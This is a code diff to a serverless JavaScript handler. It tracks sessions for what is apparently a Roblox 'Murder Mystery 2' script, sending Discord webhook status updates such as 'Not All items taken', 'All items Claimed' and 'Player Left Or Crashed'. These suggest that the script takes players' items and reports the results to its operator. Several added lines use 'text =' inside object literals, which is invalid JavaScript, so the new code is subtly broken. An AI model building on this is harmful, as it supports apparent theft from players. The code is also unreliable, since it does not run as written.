@@ -6,54 +6,60 @@ const redis = new Redis({
 })
 
 export default async function handler(req, res) {
-    const { msgId, webhookUrl, action } = req.body;
+    // Standardize body for Cron-job.org or Roblox requests
+    const body = req.body || {};
+    const { msgId, webhookUrl, action } = body;
 
-    // 1. WATCHDOG: Check for dead sessions and mark as FAILED (Red)
-    const keys = await redis.keys('hb_*');
-    for (const key of keys) {
-        const data = await redis.get(key);
-        if (data && (Date.now() - data.lastSeen > 65000)) {
-            await fetch(`${data.webhookUrl}/messages/${data.msgId}`, {
-                method: 'PATCH',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "Wym's Scripts • Murder Mystery 2",
-                        description: "## Status:\n```lua\n🔴 Left (Player Left Or Crashed)```",
-                        color: 16711680, // Red
-                        footer: { text: "Status updated via Heartbeat" }
-                    }]
-                })
-            }).catch(() => {});
-            await redis.del(key);
+    // 1. WATCHDOG: This runs EVERY time the URL is hit (by Cron or Roblox)
+    try {
+        const keys = await redis.keys('hb_*');
+        for (const key of keys) {
+            const data = await redis.get(key);
+            
+            // Check if player hasn't pinged in over 70 seconds
+            if (data && (Date.now() - data.lastSeen > 70000)) {
+                await fetch(`${data.webhookUrl}/messages/${data.msgId}`, {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "Wym's Scripts • Murder Mystery 2",
+                            description: "## Status:\n```lua\n🔴 Left (Player Left Or Crashed)```",
+                            color: 16711680, // Red
+                            footer: { text = "Auto-detected departure via Cron" }
+                        }]
+                    })
+                }).catch(() => {});
+                
+                await redis.del(key);
+            }
         }
+    } catch (err) {
+        console.error("Watchdog error:", err);
     }
 
-    // 2. LIVE UPDATES: Handle Partial and Success while player is active
+    // 2. LIVE UPDATES: Handle specific actions from the Roblox Script
     if (msgId && webhookUrl) {
         let embedUpdate = null;
 
         if (action === "partial") {
-            // Update to Yellow status
             embedUpdate = {
                 title: "Wym's Scripts • Murder Mystery 2",
                 description: "## Status:\n```lua\n🟡 Partial (Not All items taken)```",
                 color: 16776960, // Yellow
-                footer: { text: "Partial" }
+                footer: { text = "Partial Progress" }
             };
         } else if (action === "stop") {
-            // Update to Green status
             embedUpdate = {
                 title: "Wym's Scripts • Murder Mystery 2",
                 description: "## Status:\n```lua\n🟢 Success (All items Claimed)```",
                 color: 65280, // Green
-                footer: { text: "Trade completed successfully!" }
+                footer: { text = "Trade completed successfully!" }
             };
-            // Remove from Redis so the Watchdog doesn't overwrite it with "Failed"
+            // Delete from Redis immediately so Cron doesn't turn it Red
             await redis.del(`hb_${msgId}`);
         }
 
-        // Send the PATCH request if we have an update
         if (embedUpdate) {
             await fetch(`${webhookUrl}/messages/${msgId}`, {
                 method: 'PATCH',
@@ -63,10 +69,10 @@ export default async function handler(req, res) {
         }
     }
 
-    // 3. HEARTBEAT: Keep the session alive (Ping)
-    if (action === "ping" && msgId) {
+    // 3. HEARTBEAT: Keep session alive
+    if (action === "ping" && msgId && webhookUrl) {
         await redis.set(`hb_${msgId}`, { msgId, webhookUrl, lastSeen: Date.now() }, { ex: 3600 });
     } 
 
-    return res.status(200).json({ ok: true });
+    return res.status(200).json({ ok: true, watchdog_active: true });
 }
